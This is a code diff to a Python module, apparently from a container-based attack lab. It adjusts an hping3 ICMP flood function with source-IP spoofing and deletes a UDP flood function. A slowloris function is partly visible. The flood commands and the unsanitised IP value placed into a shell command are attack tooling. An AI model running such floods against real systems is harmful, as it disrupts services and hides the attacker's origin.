@@ -4,9 +4,9 @@ from .settings import client
 from app import db
 
 
-def icmp_flood(container_id, ip_address=None):
+def icmp_flood(container_id, ip_address=""):
     container = client.containers.get(container_id)
-    if ip_address: # If user wants to spoof src IP
+    if ip_address != "": # If user wants to spoof src IP
         result = container.exec_run(
             f"hping3 --icmp --flood -a {ip_address} victim"
         )
@@ -14,18 +14,6 @@ def icmp_flood(container_id, ip_address=None):
         result = container.exec_run("hping3 --icmp --flood victim")
 
     print(result.output.decode())
-
-
-def udp_flood(container_id, ip_address):
-    container = client.containers.get(container_id)
-    if ip_address: # If user wants to spoof src IP
-        result = container.exec_run(
-            f"hping3 --udp -p 80 --flood -a {ip_address} victim"
-        )
-    else:
-        result = container.exec_run("hping3 --udp --flood victim")
-    print(result.output.decode())
-
 
 def slowloris(container_id, attack_duration, number_of_connections, connection_rate):
     container = client.containers.get(container_id)
